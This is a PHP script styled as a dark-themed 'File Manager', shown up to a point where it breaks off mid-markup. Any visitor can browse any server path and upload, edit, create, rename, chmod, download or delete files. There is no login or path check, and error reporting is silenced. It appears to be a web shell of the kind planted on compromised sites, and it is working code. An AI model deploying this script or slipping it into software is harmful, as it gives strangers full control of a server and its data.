<?php
@set_time_limit(0);
@error_reporting(0);

$path = isset($_GET['path']) ? $_GET['path'] : __DIR__;
$path = realpath($path);
$sort = isset($_GET['sort']) ? $_GET['sort'] : 'date_desc'; // Default sort: newest first

function h($s) { return htmlspecialchars($s, ENT_QUOTES); }
function formatBytes($size) {
    if($size < 1024) return $size.' B';
    $units = ['KB','MB','GB','TB'];
    for($i = 0; $size >= 1024 && $i < 4; $i++) $size /= 1024;
    return round($size, 1).' '.$units[$i];
}

function formatDate($timestamp) {
    return date('M j, Y H:i', $timestamp);
}

function formatPermissions($perms) {
    $info = '';
    if (($perms & 0xC000) == 0xC000) $info = 's';
    elseif (($perms & 0xA000) == 0xA000) $info = 'l';
    elseif (($perms & 0x8000) == 0x8000) $info = '-';
    elseif (($perms & 0x6000) == 0x6000) $info = 'b';
    elseif (($perms & 0x4000) == 0x4000) $info = 'd';
    elseif (($perms & 0x2000) == 0x2000) $info = 'c';
    elseif (($perms & 0x1000) == 0x1000) $info = 'p';
    else $info = 'u';
    
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
    
    return substr($info, 1);
}

// Handle navigation
if(isset($_GET['cd'])) {
    $new = realpath($path.'/'.$_GET['cd']);
    if(is_dir($new)) { header("Location: ?path=".urlencode($new)."&sort=".urlencode($sort)); exit; }
}

// Handle file operations
if(isset($_GET['del'])) {
    $target = realpath($path.'/'.$_GET['del']);
    if(is_file($target)) unlink($target);
    if(is_dir($target)) @rmdir($target);
    header("Location: ?path=".urlencode($path)."&sort=".urlencode($sort)); exit;
}

// Handle bulk delete
if(isset($_POST['bulk_delete']) && !empty($_POST['selected_items'])) {
    foreach($_POST['selected_items'] as $item) {
        $target = realpath($path.'/'.urldecode($item));
        if(is_file($target)) unlink($target);
        if(is_dir($target)) @rmdir($target);
    }
    header("Location: ?path=".urlencode($path)."&sort=".urlencode($sort)); exit;
}

// Handle backup
if(isset($_GET['backup'])) {
    $target = realpath($path.'/'.$_GET['backup']);
    if(is_file($target)) {
        $backup_name = basename($target).'.bak_'.date('Ymd_His');
        copy($target, $path.'/'.$backup_name);
        header("Location: ?path=".urlencode($path)."&sort=".urlencode($sort)); exit;
    }
}

if(isset($_GET['dl'])) {
    $target = realpath($path.'/'.$_GET['dl']);
    if(is_file($target)) {
        header("Content-Type: application/octet-stream");
        header("Content-Disposition: attachment; filename=\"".basename($target)."\"");
        readfile($target); exit;
    }
}

// File editor (unchanged)
if(isset($_GET['edit'])) {
    $file = realpath($path.'/'.$_GET['edit']);
    if($_SERVER['REQUEST_METHOD'] === 'POST') {
        file_put_contents($file, $_POST['content']);
        header("Location: ?path=".urlencode($path)."&sort=".urlencode($sort)); exit;
    }
    
    echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>".h(basename($file))."</title>
<link href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css' rel='stylesheet'>
<script src='https://cdn.tailwindcss.com'></script>
<script>
tailwind.config = {
  darkMode: 'class',
  theme: {
    extend: {
      colors: {
        gray: {
          850: '#1f2937',
          875: '#18202b',
          925: '#111827'
        }
      }
    }
  }
}
</script>
</head><body class='dark bg-gray-900 text-gray-100 min-h-screen'>
<form method='POST' class='h-screen flex flex-col'>
<div class='bg-gray-800 border-b border-gray-700 px-6 py-4 flex items-center justify-between'>
<div class='flex items-center space-x-3'>
<i class='fas fa-edit text-blue-400'></i>
<h1 class='text-lg font-semibold text-gray-100'>".h(basename($file))."</h1>
</div>
<div class='flex items-center space-x-3'>
<button type='submit' class='inline-flex items-center px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white text-sm font-medium rounded-lg transition-colors duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 focus:ring-offset-gray-800'>
<i class='fas fa-save mr-2'></i>Save
</button>
<a href='?path=".urlencode(dirname($file))."&sort=".urlencode($sort)."' class='inline-flex items-center px-4 py-2 bg-gray-600 hover:bg-gray-700 text-white text-sm font-medium rounded-lg transition-colors duration-200 focus:outline-none focus:ring-2 focus:ring-gray-500 focus:ring-offset-2 focus:ring-offset-gray-800'>
<i class='fas fa-arrow-left mr-2'></i>Back
</a>
</div>
</div>
<textarea name='content' class='flex-1 bg-gray-900 text-gray-100 font-mono text-sm p-6 resize-none focus:outline-none border-0' placeholder='Start typing...'>".h(file_get_contents($file))."</textarea>
<div class='bg-gray-800 border-t border-gray-700 px-6 py-3 flex items-center justify-between text-sm text-gray-400'>
<span>".h(basename($file))." • ".formatBytes(filesize($file))."</span>
<span class='flex items-center space-x-2'>
<div class='w-2 h-2 bg-green-400 rounded-full'></div>
<span>Ready</span>
</span>
</div>
</form></body></html>";
    exit;
}

// Handle permissions change (unchanged)
if(isset($_GET['chmod'])) {
    $file = realpath($path.'/'.$_GET['chmod']);
    if($_SERVER['REQUEST_METHOD'] === 'POST') {
        $newPerms = octdec($_POST['permissions']);
        chmod($file, $newPerms);
        header("Location: ?path=".urlencode($path)."&sort=".urlencode($sort)); exit;
    }
    $currentPerms = substr(sprintf('%o', fileperms($file)), -3);
    echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<link href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css' rel='stylesheet'>
<script src='https://cdn.tailwindcss.com'></script>
<script>
tailwind.config = {
  darkMode: 'class',
}
</script>
</head><body class='dark bg-gray-900 text-gray-100 min-h-screen flex items-center justify-center p-4'>
<div class='bg-gray-800 rounded-2xl shadow-2xl p-8 w-full max-w-md border border-gray-700'>
<div class='flex items-center space-x-3 mb-6'>
<i class='fas fa-lock text-blue-400 text-xl'></i>
<h1 class='text-xl font-semibold text-gray-100'>Edit Permissions</h1>
</div>
<div class='bg-gray-700 rounded-lg p-3 mb-6 text-sm text-gray-300'>
Current: ".formatPermissions(fileperms($file))." ($currentPerms)
</div>
<form method='POST' class='space-y-6'>
<div class='space-y-4'>
<div class='bg-gray-700 rounded-lg p-4'>
<h3 class='text-sm font-medium text-gray-300 mb-3'>Owner</h3>
<div class='flex space-x-4'>
<label class='flex items-center space-x-2 text-sm'>
<input type='checkbox' name='owner_r' class='w-4 h-4 text-blue-600 bg-gray-600 border-gray-500 rounded focus:ring-blue-500 focus:ring-2' ".($currentPerms[0]&4?'checked':'').">
<span>Read</span>
</label>
<label class='flex items-center space-x-2 text-sm'>
<input type='checkbox' name='owner_w' class='w-4 h-4 text-blue-600 bg-gray-600 border-gray-500 rounded focus:ring-blue-500 focus:ring-2' ".($currentPerms[0]&2?'checked':'').">
<span>Write</span>
</label>
<label class='flex items-center space-x-2 text-sm'>
<input type='checkbox' name='owner_x' class='w-4 h-4 text-blue-600 bg-gray-600 border-gray-500 rounded focus:ring-blue-500 focus:ring-2' ".($currentPerms[0]&1?'checked':'').">
<span>Execute</span>
</label>
</div>
</div>
<div class='bg-gray-700 rounded-lg p-4'>
<h3 class='text-sm font-medium text-gray-300 mb-3'>Group</h3>
<div class='flex space-x-4'>
<label class='flex items-center space-x-2 text-sm'>
<input type='checkbox' name='group_r' class='w-4 h-4 text-blue-600 bg-gray-600 border-gray-500 rounded focus:ring-blue-500 focus:ring-2' ".($currentPerms[1]&4?'checked':'').">
<span>Read</span>
</label>
<label class='flex items-center space-x-2 text-sm'>
<input type='checkbox' name='group_w' class='w-4 h-4 text-blue-600 bg-gray-600 border-gray-500 rounded focus:ring-blue-500 focus:ring-2' ".($currentPerms[1]&2?'checked':'').">
<span>Write</span>
</label>
<label class='flex items-center space-x-2 text-sm'>
<input type='checkbox' name='group_x' class='w-4 h-4 text-blue-600 bg-gray-600 border-gray-500 rounded focus:ring-blue-500 focus:ring-2' ".($currentPerms[1]&1?'checked':'').">
<span>Execute</span>
</label>
</div>
</div>
<div class='bg-gray-700 rounded-lg p-4'>
<h3 class='text-sm font-medium text-gray-300 mb-3'>Others</h3>
<div class='flex space-x-4'>
<label class='flex items-center space-x-2 text-sm'>
<input type='checkbox' name='other_r' class='w-4 h-4 text-blue-600 bg-gray-600 border-gray-500 rounded focus:ring-blue-500 focus:ring-2' ".($currentPerms[2]&4?'checked':'').">
<span>Read</span>
</label>
<label class='flex items-center space-x-2 text-sm'>
<input type='checkbox' name='other_w' class='w-4 h-4 text-blue-600 bg-gray-600 border-gray-500 rounded focus:ring-blue-500 focus:ring-2' ".($currentPerms[2]&2?'checked':'').">
<span>Write</span>
</label>
<label class='flex items-center space-x-2 text-sm'>
<input type='checkbox' name='other_x' class='w-4 h-4 text-blue-600 bg-gray-600 border-gray-500 rounded focus:ring-blue-500 focus:ring-2' ".($currentPerms[2]&1?'checked':'').">
<span>Execute</span>
</label>
</div>
</div>
</div>
<input type='text' name='permissions' class='w-full px-4 py-3 bg-gray-700 border border-gray-600 rounded-lg text-center font-mono text-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent' value='$currentPerms' placeholder='755' pattern='[0-7]{3}' title='3-digit octal permissions'>
<div class='flex space-x-3'>
<button type='submit' class='flex-1 inline-flex items-center justify-center px-4 py-3 bg-blue-600 hover:bg-blue-700 text-white font-medium rounded-lg transition-colors duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 focus:ring-offset-gray-800'>
<i class='fas fa-save mr-2'></i>Apply
</button>
<a href='?path=".urlencode($path)."&sort=".urlencode($sort)."' class='flex-1 inline-flex items-center justify-center px-4 py-3 bg-gray-600 hover:bg-gray-700 text-white font-medium rounded-lg transition-colors duration-200 focus:outline-none focus:ring-2 focus:ring-gray-500 focus:ring-offset-2 focus:ring-offset-gray-800 text-center'>
<i class='fas fa-times mr-2'></i>Cancel
</a>
</div>
</form>
<script>
const checkboxes = document.querySelectorAll('input[type=checkbox]');
const octalInput = document.querySelector('input[name=permissions]');
function updateOctal() {
    let owner = 0, group = 0, other = 0;
    if(document.querySelector('[name=owner_r]').checked) owner += 4;
    if(document.querySelector('[name=owner_w]').checked) owner += 2;
    if(document.querySelector('[name=owner_x]').checked) owner += 1;
    if(document.querySelector('[name=group_r]').checked) group += 4;
    if(document.querySelector('[name=group_w]').checked) group += 2;
    if(document.querySelector('[name=group_x]').checked) group += 1;
    if(document.querySelector('[name=other_r]').checked) other += 4;
    if(document.querySelector('[name=other_w]').checked) other += 2;
    if(document.querySelector('[name=other_x]').checked) other += 1;
    octalInput.value = owner.toString() + group.toString() + other.toString();
}
checkboxes.forEach(cb => cb.addEventListener('change', updateOctal));
</script>
</div></body></html>";
    exit;
}

if(isset($_GET['rename'])) {
    $old = realpath($path.'/'.$_GET['rename']);
    if($_SERVER['REQUEST_METHOD'] === 'POST') {
        rename($old, $path.'/'.$_POST['newname']);
        header("Location: ?path=".urlencode($path)."&sort=".urlencode($sort)); exit;
    }
    echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<link href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css' rel='stylesheet'>
<script src='https://cdn.tailwindcss.com'></script>
<script>
tailwind.config = {
  darkMode: 'class',
}
</script>
</head><body class='dark bg-gray-900 text-gray-100 min-h-screen flex items-center justify-center p-4'>
<div class='bg-gray-800 rounded-2xl shadow-2xl p-8 w-full max-w-md border border-gray-700'>
<div class='flex items-center space-x-3 mb-6'>
<i class='fas fa-edit text-blue-400 text-xl'></i>
<h1 class='text-xl font-semibold text-gray-100'>Rename File</h1>
</div>
<form method='POST' class='space-y-6'>
<input type='text' name='newname' value='".h(basename($old))."' required autofocus class='w-full px-4 py-3 bg-gray-700 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent'>
<div class='flex space-x-3'>
<button type='submit' class='flex-1 px-4 py-3 bg-blue-600 hover:bg-blue-700 text-white font-medium rounded-lg transition-colors duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 focus:ring-offset-gray-800'>
Rename
</button>
<a href='?path=".urlencode($path)."&sort=".urlencode($sort)."' class='flex-1 px-4 py-3 bg-gray-600 hover:bg-gray-700 text-white font-medium rounded-lg transition-colors duration-200 focus:outline-none focus:ring-2 focus:ring-gray-500 focus:ring-offset-2 focus:ring-offset-gray-800 text-center'>
Cancel
</a>
</div>
</form></div></body></html>";
    exit;
}

// Handle uploads and new items
if($_SERVER['REQUEST_METHOD'] === 'POST') {
    if(isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
        move_uploaded_file($_FILES['file']['tmp_name'], $path.'/'.basename($_FILES['file']['name']));
    }
    if(isset($_POST['newfolder'])) mkdir($path.'/'.$_POST['newfolder']);
    if(isset($_POST['newfile'])) file_put_contents($path.'/'.$_POST['newfile'], "");
    header("Location: ?path=".urlencode($path)."&sort=".urlencode($sort)); exit;
}

// Get files and folders with modification times
$items = scandir($path);
$dirs = $files = [];
foreach($items as $item) {
    if($item === "." || $item === "..") continue;
    $full = $path.'/'.$item;
    $mtime = filemtime($full);
    if(is_dir($full)) {
        $dirs[] = ['name' => $item, 'mtime' => $mtime];
    } else {
        $files[] = ['name' => $item, 'mtime' => $mtime];
    }
}

// Sort function
function sortItems($a, $b, $sortType = 'date_desc') {
    if($sortType === 'date_asc') {
        return $a['mtime'] - $b['mtime'];
    }
    return $b['mtime'] - $a['mtime']; // date_desc (newest first)
}

// Apply sorting
usort($dirs, function($a, $b) use ($sort) { return sortItems($a, $b, $sort); });
usort($files, function($a, $b) use ($sort) { return sortItems($a, $b, $sort); });

// File icons
function getIcon($item, $isDir) {
    if($isDir) return 'fas fa-folder text-blue-400';
    $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
    $icons = [
        'php'=>'fab fa-php text-indigo-400', 'js'=>'fab fa-js text-yellow-400', 'html'=>'fab fa-html5 text-orange-400', 'css'=>'fab fa-css3 text-blue-400',
        'json'=>'fas fa-code text-green-400', 'xml'=>'fas fa-code text-green-400', 'txt'=>'fas fa-file-alt text-gray-400', 'md'=>'fab fa-markdown text-gray-300',
        'jpg'=>'fas fa-image text-purple-400', 'jpeg'=>'fas fa-image text-purple-400', 'png'=>'fas fa-image text-purple-400', 'gif'=>'fas fa-image text-purple-400',
        'pdf'=>'fas fa-file-pdf text-red-400', 'zip'=>'fas fa-file-archive text-yellow-500', 'sql'=>'fas fa-database text-blue-500'
    ];
    return isset($icons[$ext]) ? $icons[$ext] : 'fas fa-file text-gray-400';
}

echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>File Manager</title>
<link href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css' rel='stylesheet'>
<script src='https://cdn.tailwindcss.com'></script>
<script>
tailwind.config = {
  darkMode: 'class',
  theme: {
    extend: {
      animation: {
        'fade-in': 'fadeIn 0.3s ease-in-out',
        'slide-up': 'slideUp 0.3s ease-out'
      },
      keyframes: {
        fadeIn: {
          '0%': { opacity: '0' },
          '100%': { opacity: '1' }
        },
        slideUp: {
          '0%': { transform: 'translateY(10px)', opacity: '0' },
          '100%': { transform: 'translateY(0)', opacity: '1' }
        }
      }
    }
  }
}
</script>
</head><body class='dark bg-gray-900 text-gray-100 min-h-screen'>
<div class='max-w-7xl mx-auto p-4 sm:p-6 lg:p-8'>

<!-- Header -->
<div class='bg-gradient-to-r from-gray-800 to-gray-700 rounded-2xl shadow-2xl p-6 mb-8 border border-gray-600 animate-fade-in'>
<div class='flex items-center space-x-4'>
<div class='p-3 bg-blue-600 rounded-xl shadow-lg'>
<i class='fas fa-hdd text-white text-xl'></i>
</div>
<div class='flex-1'>
<h1 class='text-2xl font-bold text-gray-100 mb-2'>File Manager</h1>
<div class='flex items-center space-x-2 text-sm text-gray-300'>";

$parts = explode(DIRECTORY_SEPARATOR, $path);
$crumb = '';
foreach($parts as $i => $part) {
    if($part === '') continue;
    $crumb .= DIRECTORY_SEPARATOR.$part;
    if($i === count($parts)-1) {
        echo "<span class='px-3 py-1 bg-gray-600 rounded-full font-medium'>".h($part)."</span>";
    } else {
        echo "<a href='?path=".urlencode($crumb)."&sort=".urlencode($sort)."' class='px-3 py-1 bg-gray-700 hover:bg-gray-600 rounded-full transition-colors duration-200'>".h($part)."</a>";
        if($i < count($parts)-2) echo "<i class='fas fa-chevron-right text-gray-500 text-xs'></i>";
    }
}

echo "</div>
</div>
<div class='flex items-center space-x-3'>
<select id='sortSelect' onchange='window.location=\"?path=".urlencode($path)."&sort=\"+this.value' class='px-3 py-2 bg-gray-700 border border-gray-600 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-blue-500'>
    <option value='date_desc' ".($sort === 'date_desc' ? 'selected' : '').">Newest First</option>
    <option value='date_asc' ".($sort === 'date_asc' ? 'selected' : '').">Oldest First</option>
</select>
</div>
</div>
</div>

<!-- Toolbar -->
<div class='grid grid-cols-1 md:grid-cols-3 gap-4 mb-8'>
<form method='POST' enctype='multipart/form-data' class='bg-gray-800 rounded-xl p-4 border border-gray-700 shadow-lg hover:shadow-xl transition-shadow duration-300 animate-slide-up'>
<div class='flex items-center space-x-3 mb-3'>
<i class='fas fa-upload text-green-400'></i>
<h3 class='font-medium text-gray-200'>Upload File</h3>
</div>
<div class='flex space-x-3'>
<input type='file' name='file' required class='flex-1 text-sm text-gray-400 file:mr-4 file:py-2 file:px-4 file:rounded-lg file:border-0 file:text-sm file:font-medium file:bg-blue-600 file:text-white hover:file:bg-blue-700 file:cursor-pointer'>
<button type='submit' class='px-4 py-2 bg-green-600 hover:bg-green-700 text-white rounded-lg transition-colors duration-200 focus:outline-none focus:ring-2 focus:ring-green-500 focus:ring-offset-2 focus:ring-offset-gray-800'>
<i class='fas fa-upload'></i>
</button>
</div>
</form>

<form method='POST' class='bg-gray-800 rounded-xl p-4 border border-gray-700 shadow-lg hover:shadow-xl transition-shadow duration-300 animate-slide-up' style='animation-delay: 0.1s'>
<div class='flex items-center space-x-3 mb-3'>
<i class='fas fa-folder-plus text-blue-400'></i>
<h3 class='font-medium text-gray-200'>New Folder</h3>
</div>
<div class='flex space-x-3'>
<input type='text' name='newfolder' placeholder='Folder name' required class='flex-1 px-3 py-2 bg-gray-700 border border-gray-600 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent'>
<button type='submit' class='px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition-colors duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 focus:ring-offset-gray-800'>
<i class='fas fa-plus'></i>
</button>
</div>
</form>

<form method='POST' class='bg-gray-800 rounded-xl p-4 border border-gray-700 shadow-lg hover:shadow-xl transition-shadow duration-300 animate-slide-up' style='animation-delay: 0.2s'>
<div class='flex items-center space-x-3 mb-3'>
<i class='fas fa-file-plus text-purple-400'></i>
<h3 class='font-medium text-gray-200'>New File</h3>
</div>
<div class='flex space-x-3'>
<input type='text' name='newfile' placeholder='File name' required class='flex-1 px-3 py-2 bg-gray-700 border border-gray-600 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent'>
<button type='submit' class='px-4 py-2 bg-purple-600 hover:bg-purple-700 text-white rounded-lg transition-colors duration-200 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:ring-offset-2 focus:ring-offset-gray-800'>
<i class='fas fa-plus'></i>
</button>
</div>
</form>
</div>

<!-- Files Table -->
<form method='POST' id='bulkForm'>
<div class='bg-gray-800 rounded-2xl shadow-2xl border border-gray-700 overflow-hidden animate-fade-in'>
<!-- Desktop Header -->
<div class='hidden lg:grid lg:grid-cols-12 gap-4 bg-gray-700 px-6 py-4 text-sm font-medium text-gray-300 border-b border-gray-600'>
<div class='col-span-1'>
    <input type='checkbox' id='selectAll' class='w-4 h-4 text-blue-600 bg-gray-600 border-gray-500 rounded focus:ring-blue-500 focus:ring-2'>
</div>
<div class='col-span-4'>Name</div>
<div class='col-span-1'>Type</div>
<div class='col-span-1'>Size</div>
<div class='col-span-2'>Modified</div>
<div class='col-span-1'>Permissions</div>
<div class='col-span-2'>Actions</div>
</div>

<div class='divide-y divide-gray-700'>";

// Display directories
foreach($dirs as $item) {
    $full = $path.'/'.$item['name'];
    $modified = formatDate($item['mtime']);
    $perms = formatPermissions(fileperms($full));
    echo "
    <!-- Desktop Layout -->
    <div class='hidden lg:grid lg:grid-cols-12 gap-4 px-6 py-4 hover:bg-gray-750 transition-colors duration-200 group'>
    <div class='col-span-1'>
        <input type='checkbox' name='selected_items[]' value='".urlencode($item['name'])."' class='w-4 h-4 text-blue-600 bg-gray-600 border-gray-500 rounded focus:ring-blue-500 focus:ring-2'>
    </div>
    <div class='col-span-4'>
    <a href='?path=".urlencode($full)."&sort=".urlencode($sort)."' class='flex items-center space-x-3 text-gray-100 hover:text-blue-400 transition-colors duration-200'>
    <i class='".getIcon($item['name'], true)." text-lg'></i>
    <span class='font-medium'>".h($item['name'])."</span>
    </a>
    </div>
    <div class='col-span-1'>
    <span class='inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-blue-600 text-white'>DIR</span>
    </div>
    <div class='col-span-1 text-gray-400 text-sm'>-</div>
    <div class='col-span-2 text-gray-400 text-sm'>$modified</div>
    <div class='col-span-1'>
    <a href='?path=".urlencode($path)."&chmod=".urlencode($item['name'])."&sort=".urlencode($sort)."' class='text-xs font-mono text-gray-400 hover:text-blue-400 transition-colors duration-200 bg-gray-700 px-2 py-1 rounded' title='Click to edit permissions'>$perms</a>
    </div>
    <div class='col-span-2 flex items-center space-x-2 opacity-0 group-hover:opacity-100 transition-opacity duration-200'>
    <a href='?path=".urlencode($path)."&rename=".urlencode($item['name'])."&sort=".urlencode($sort)."' class='p-2 text-gray-400 hover:text-blue-400 rounded-lg hover:bg-gray-700 transition-all duration-200' title='Rename'>
    <i class='fas fa-edit text-sm'></i>
    </a>
    <a href='?path=".urlencode($path)."&del=".urlencode($item['name'])."&sort=".urlencode($sort)."' onclick='return confirm(\"Delete this folder?\")' class='p-2 text-gray-400 hover:text-red-400 rounded-lg hover:bg-gray-700 transition-all duration-200' title='Delete'>
    <i class='fas fa-trash text-sm'></i>
    </a>
    </div>
    </div>
    
    <!-- Mobile Layout -->
    <div class='lg:hidden px-6 py-4 hover:bg-gray-750 transition-colors duration-200'>
    <div class='flex items-center justify-between mb-2'>
    <div class='flex items-center space-x-3'>
    <input type='checkbox' name='selected_items[]' value='".urlencode($item['name'])."' class='w-4 h-4 text-blue-600 bg-gray-600 border-gray-500 rounded focus:ring-blue-500 focus:ring-2'>
    <a href='?path=".urlencode($full)."&sort=".urlencode($sort)."' class='flex items-center space-x-3 text-gray-100 hover:text-blue-400 transition-colors duration-200'>
    <i class='".getIcon($item['name'], true)." text-lg'></i>
    <span class='font-medium'>".h($item['name'])."</span>
    </a>
    </div>
    <span class='inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-blue-600 text-white'>DIR</span>
    </div>
    <div class='flex items-center justify-between text-sm text-gray-400 mb-3'>
    <span>$modified</span>
    <span class='font-mono text-xs bg-gray-700 px-2 py-1 rounded'>$perms</span>
    </div>
    <div class='flex items-center space-x-3'>
    <a href='?path=".urlencode($path)."&chmod=".urlencode($item['name'])."&sort=".urlencode($sort)."' class='flex items-center space-x-1 px-3 py-1.5 text-xs bg-gray-600 hover:bg-gray-700 rounded-lg transition-colors duration-200'>
    <i class='fas fa-lock'></i>
    <span>Permissions</span>
    </a>
    <a href='?path=".urlencode($path)."&rename=".urlencode($item['name'])."&sort=".urlencode($sort)."' class='flex items-center space-x-1 px-3 py-1.5 text-xs bg-blue-600 hover:bg-blue-700 rounded-lg transition-colors duration-200'>
    <i class='fas fa-edit'></i>
    <span>Rename</span>
    </a>
    <a href='?path=".urlencode($path)."&del=".urlencode($item['name'])."&sort=".urlencode($sort)."' onclick='return confirm(\"Delete this folder?\")' class='flex items-center space-x-1 px-3 py-1.5 text-xs bg-red-600 hover:bg-red-700 rounded-lg transition-colors duration-200'>
    <i class='fas fa-trash'></i>
    <span>Delete</span>
    </a>
    </div>
    </div>";
}

// Display files
foreach($files as $item) {
    $full = $path.'/'.$item['name'];
    $size = filesize($full);
    $modified = formatDate($item['mtime']);
    $perms = formatPermissions(fileperms($full));
    $ext = strtolower(pathinfo($item['name'], PATHINFO_EXTENSION));
    $typeLabel = strtoupper($ext ?: 'FILE');
    
    echo "
    <!-- Desktop Layout -->
    <div class='hidden lg:grid lg:grid-cols-12 gap-4 px-6 py-4 hover:bg-gray-750 transition-colors duration-200 group'>
    <div class='col-span-1'>
        <input type='checkbox' name='selected_items[]' value='".urlencode($item['name'])."' class='w-4 h-4 text-blue-600 bg-gray-600 border-gray-500 rounded focus:ring-blue-500 focus:ring-2'>
    </div>
    <div class='col-span-4 flex items-center space-x-3'>
    <i class='".getIcon($item['name'], false)." text-lg'></i>
    <span class='font-medium text-gray-100'>".h($item['name'])."</span>
    </div>
    <div class='col-span-1'>
    <span class='inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-gray-600 text-gray-200'>$typeLabel</span>
    </div>
    <div class='col-span-1 text-gray-400 text-sm'>".formatBytes($size)."</div>
    <div class='col-span-2 text-gray-400 text-sm'>$modified</div>
    <div class='col-span-1'>
    <a href='?path=".urlencode($path)."&chmod=".urlencode($item['name'])."&sort=".urlencode($sort)."' class='text-xs font-mono text-gray-400 hover:text-blue-400 transition-colors duration-200 bg-gray-700 px-2 py-1 rounded' title='Click to edit permissions'>$perms</a>
    </div>
    <div class='col-span-2 flex items-center space-x-2 opacity-0 group-hover:opacity-100 transition-opacity duration-200'>
    <a href='?path=".urlencode($path)."&dl=".urlencode($item['name'])."&sort=".urlencode($sort)."' class='p-2 text-gray-400 hover:text-green-400 rounded-lg hover:bg-gray-700 transition-all duration-200' title='Download'>
    <i class='fas fa-download text-sm'></i>
    </a>
    <a href='?path=".urlencode($path)."&edit=".urlencode($item['name'])."&sort=".urlencode($sort)."' class='p-2 text-gray-400 hover:text-blue-400 rounded-lg hover:bg-gray-700 transition-all duration-200' title='Edit'>
    <i class='fas fa-edit text-sm'></i>
    </a>
    <a href='?path=".urlencode($path)."&backup=".urlencode($item['name'])."&sort=".urlencode($sort)."' class='p-2 text-gray-400 hover:text-purple-400 rounded-lg hover:bg-gray-700 transition-all duration-200' title='Backup'>
    <i class='fas fa-copy text-sm'></i>
    </a>
    <a href='?path=".urlencode($path)."&rename=".urlencode($item['name'])."&sort=".urlencode($sort)."' class='p-2 text-gray-400 hover:text-yellow-400 rounded-lg hover:bg-gray-700 transition-all duration-200' title='Rename'>
    <i class='fas fa-pen text-sm'></i>
    </a>
    <a href='?path=".urlencode($path)."&del=".urlencode($item['name'])."&sort=".urlencode($sort)."' onclick='return confirm(\"Delete this file?\")' class='p-2 text-gray-400 hover:text-red-400 rounded-lg hover:bg-gray-700 transition-all duration-200' title='Delete'>
    <i class='fas fa-trash text-sm'></i>
    </a>
    </div>
    </div>
    
    <!-- Mobile Layout -->
    <div class='lg:hidden px-6 py-4 hover:bg-gray-750 transition-colors duration-200'>
    <div class='flex items-center justify-between mb-2'>
    <div class='flex items-center space-x-3'>
    <input type='checkbox' name='selected_items[]' value='".urlencode($item['name'])."' class='w-4 h-4 text-blue-600 bg-gray-600 border-gray-500 rounded focus:ring-blue-500 focus:ring-2'>
    <i class='".getIcon($item['name'], false)." text-lg'></i>
    <span class='font-medium text-gray-100'>".h($item['name'])."</span>
    </div>
    <span class='inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-gray-600 text-gray-200'>$typeLabel</span>
    </div>
    <div class='flex items-center justify-between text-sm text-gray-400 mb-3'>
    <span>".formatBytes($size)." • $modified</span>
    <span class='font-mono text-xs bg-gray-700 px-2 py-1 rounded'>$perms</span>
    </div>
    <div class='grid grid-cols-2 gap-2'>
    <a href='?path=".urlencode($path)."&dl=".urlencode($item['name'])."&sort=".urlencode($sort)."' class='flex items-center justify-center space-x-1 px-3 py-2 text-xs bg-green-600 hover:bg-green-700 rounded-lg transition-colors duration-200'>
    <i class='fas fa-download'></i>
    <span>Download</span>
    </a>
    <a href='?path=".urlencode($path)."&edit=".urlencode($item['name'])."&sort=".urlencode($sort)."' class='flex items-center justify-center space-x-1 px-3 py-2 text-xs bg-blue-600 hover:bg-blue-700 rounded-lg transition-colors duration-200'>
    <i class='fas fa-edit'></i>
    <span>Edit</span>
    </a>
    <a href='?path=".urlencode($path)."&backup=".urlencode($item['name'])."&sort=".urlencode($sort)."' class='flex items-center justify-center space-x-1 px-3 py-2 text-xs bg-purple-600 hover:bg-purple-700 rounded-lg transition-colors duration-200'>
    <i class='fas fa-copy'></i>
    <span>Backup</span>
    </a>
    <a href='?path=".urlencode($path)."&chmod=".urlencode($item['name'])."&sort=".urlencode($sort)."' class='flex items-center justify-center space-x-1 px-3 py-2 text-xs bg-gray-600 hover:bg-gray-700 rounded-lg transition-colors duration-200'>
    <i class='fas fa-lock'></i>
    <span>Permissions</span>
    </a>
